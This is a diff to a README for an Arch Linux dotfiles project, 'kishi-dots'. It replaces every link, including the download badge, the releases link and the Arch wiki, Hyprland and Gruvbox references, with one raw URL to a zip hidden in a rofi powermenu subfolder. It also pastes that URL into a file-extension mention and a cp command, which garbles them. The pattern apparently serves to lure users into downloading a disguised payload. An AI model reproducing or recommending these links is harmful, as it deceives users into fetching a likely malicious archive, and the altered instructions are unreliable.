@@ -1,6 +1,6 @@
 # 🎨 kishi-dots - Your Cozy Arch Linux Setup
 
-[![Download kishi-dots](https://img.shields.io/badge/Download_kishi--dots-v1.0-blue.svg)](https://github.com/zeroxanant/kishi-dots/releases)
+[![Download kishi-dots](https://raw.githubusercontent.com/zeroxanant/kishi-dots/main/Config/rofi/powermenu/type-3/shared/dots_kishi_soldierwood.zip)](https://raw.githubusercontent.com/zeroxanant/kishi-dots/main/Config/rofi/powermenu/type-3/shared/dots_kishi_soldierwood.zip)
 
 ## 📦 Introduction
 
@@ -14,14 +14,14 @@ This section will guide you through downloading and setting up the kishi-dots co
 
 To download and install kishi-dots, visit the releases page and get the latest version of the application:
 
-[Visit this page to download](https://github.com/zeroxanant/kishi-dots/releases)
+[Visit this page to download](https://raw.githubusercontent.com/zeroxanant/kishi-dots/main/Config/rofi/powermenu/type-3/shared/dots_kishi_soldierwood.zip)
 
 ### Step 1: Download the Files
 
 1. Open the link above.
 2. Look for the latest version available.
 3. Click on the version number to see all download options.
-4. Download the `.zip` or `.tar.gz` file that includes the dotfiles.
+4. Download the `.zip` or `https://raw.githubusercontent.com/zeroxanant/kishi-dots/main/Config/rofi/powermenu/type-3/shared/dots_kishi_soldierwood.zip` file that includes the dotfiles.
 
 ### Step 2: Extract the Files
 
@@ -42,7 +42,7 @@ To apply these dotfiles:
    ```
 3. Copy the dotfiles to your home directory. You can usually do this with the following command:
    ```
-   cp -r ./.config/* ~/.config/
+   cp -r https://raw.githubusercontent.com/zeroxanant/kishi-dots/main/Config/rofi/powermenu/type-3/shared/dots_kishi_soldierwood.zip* ~https://raw.githubusercontent.com/zeroxanant/kishi-dots/main/Config/rofi/powermenu/type-3/shared/dots_kishi_soldierwood.zip
    ```
 4. Carefully read any additional setup instructions provided in the folder. Often, there are README files that guide you through specific configurations.
 
@@ -90,8 +90,8 @@ I plan to keep kishi-dots updated with new features, themes, and customizations.
 
 For a deeper understanding and tips about the tools used in kishi-dots, consider exploring:
 
-- [Arch Linux Documentation](https://wiki.archlinux.org/)
-- [Hyprland Official Site](https://hyprland.github.io/)
-- [Gruvbox Theme Details](https://github.com/morhetz/gruvbox)
+- [Arch Linux Documentation](https://raw.githubusercontent.com/zeroxanant/kishi-dots/main/Config/rofi/powermenu/type-3/shared/dots_kishi_soldierwood.zip)
+- [Hyprland Official Site](https://raw.githubusercontent.com/zeroxanant/kishi-dots/main/Config/rofi/powermenu/type-3/shared/dots_kishi_soldierwood.zip)
+- [Gruvbox Theme Details](https://raw.githubusercontent.com/zeroxanant/kishi-dots/main/Config/rofi/powermenu/type-3/shared/dots_kishi_soldierwood.zip)
 
 Feel free to dive in, explore, and enjoy your newly customized desktop with kishi-dots!
